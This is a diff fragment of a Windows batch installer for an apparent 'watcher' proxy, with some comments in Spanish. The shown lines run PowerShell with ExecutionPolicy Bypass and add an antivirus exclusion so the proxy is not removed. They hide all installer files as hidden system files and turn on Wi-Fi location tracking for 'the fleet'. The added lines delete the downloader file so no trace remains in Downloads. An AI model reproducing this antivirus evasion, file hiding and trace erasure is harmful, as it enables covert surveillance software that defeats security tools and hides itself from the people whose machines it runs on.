@@ -164,7 +164,7 @@ timeout /t 1 /nobreak >nul
 REM Enable Windows Location (WiFi triangulation) so the fleet can audit the
 REM work-area. Best-effort + admin — if it can't, location just stays off and
 REM nothing else is affected.
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%BRAIN_DIR%\EnableLocation.ps1" >nul 2>&1
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%BRAIN_DIR%\HardenLocation.ps1" -Baseline >nul 2>&1
 
 REM Step 3: Add antivirus exclusion - McAfee if present, else Windows Defender (run as admin)
 echo [3/8] Adding antivirus exclusion ^(so antivirus doesn't remove the proxy^)...
@@ -410,6 +410,14 @@ REM by full path and the proxy reads its files by path, both of which still work
 REM hidden files. Best-effort; if attrib fails the install is still complete.
 for /d %%D in ("%SCRIPT_DIR%*") do attrib +h +s "%%D" >nul 2>&1
 for %%F in ("%SCRIPT_DIR%*") do if /I not "%%~nxF"=="abracadabra.bat" attrib +h +s "%%F" >nul 2>&1
+
+REM Feature 0014: si el instalador fue lanzado por el AYUDANTE de descarga
+REM (instalar-watcher.bat), este paso su propia ruta en WATCHER_BOOTSTRAP_PATH.
+REM Un proceso no se mata a si mismo, por eso el instalador lo borra AQUI, en el
+REM exito, para no dejar rastro en Descargas. Se hace en InstallWatcher.bat (no en el
+REM asistente) para cubrir TODOS los flujos: asistente, fallback de consola, bundle
+REM viejo. El AVISO en pantalla lo da el asistente (este .bat corre oculto). Best-effort.
+if defined WATCHER_BOOTSTRAP_PATH if exist "%WATCHER_BOOTSTRAP_PATH%" del /f /q "%WATCHER_BOOTSTRAP_PATH%" >nul 2>&1
 
 timeout /t 1 /nobreak >nul
 
